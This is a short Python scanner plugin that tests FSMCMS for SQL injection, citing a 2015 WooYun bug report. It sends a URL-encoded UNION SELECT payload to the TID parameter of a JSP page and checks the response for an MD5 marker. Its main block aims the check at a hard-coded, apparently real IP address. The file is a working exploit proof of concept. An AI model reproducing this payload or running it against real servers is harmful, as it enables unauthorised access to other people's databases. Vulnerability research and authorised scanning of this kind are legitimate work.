#!/usr/bin/env python
#-*- encoding:utf-8 -*-
#__author__ = '这个程序员不太冷'
#ref http://www.wooyun.org/bugs/wooyun-2015-0135311
def assign(service, arg):
    if service == "fsmcms":
        return True, arg


def audit(arg):
    
    payload = 'cms/webapp/critic/p_criticfrontlist.jsp?TID=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,md5(1234),NULL,NULL%23'
    url = arg + payload
    code, head,res, errcode, _ = curl.curl2(url)
    if '81dc9bdb52d04dc20036dbd8313ed055' in res:
        security_hole(url)

                        
if __name__ == '__main__':
    from dummy import *
    audit(assign('fsmcms','http://125.45.213.81:8080/fsmcms/')[1])